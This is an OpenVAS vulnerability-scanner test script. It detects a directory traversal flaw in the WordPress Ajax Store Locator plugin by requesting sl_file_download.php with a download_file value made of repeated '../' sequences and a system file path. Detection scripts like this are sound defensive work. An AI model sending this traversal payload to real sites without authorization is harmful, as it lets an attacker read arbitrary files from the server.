###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_ajax_store_locator_dir_trav_vuln.nasl 6663 2017-07-11 09:58:05Z teissa $
#
# WordPress Ajax Store Locator Plugin Directory Traversal Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805209");
  script_version("$Revision: 6663 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-11 11:58:05 +0200 (Tue, 11 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-12-12 13:27:38 +0530 (Fri, 12 Dec 2014)");
  script_name("WordPress Ajax Store Locator Plugin Directory Traversal Vulnerability");

  script_tag(name: "summary" , value:"This host is installed with WordPress
  Ajax Store Locator Plugin and is prone to directory traversal vulnerability.");

  script_tag(name: "vuldetect" , value: "Send a crafted data via HTTP GET
  request and check whether it is possible to read a local file");

  script_tag(name: "insight" , value: "Input passed via the 'download_file'
  parameter to the sl_file_download.php script is not properly sanitized before
  being returned to the user.");

  script_tag(name: "impact" , value: "Successful exploitation will allow
  attacker to read arbitrary files on the target system.

  Impact Level: System/Application");

  script_tag(name: "affected" , value: "WordPress Ajax Store Locator version 1.2
  and prior.");

  script_tag(name: "solution" , value: "No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/35493");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

# Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

# Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = dir + "/wp-content/plugins/ajax-store-locator/sl_file_download.php?"
            + "download_file=" +  crap(data:"../",length:3*15) + files[file];

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:http_port, url:url, pattern:file))
  {
    security_message(port:http_port);
    exit(0);
  }
}
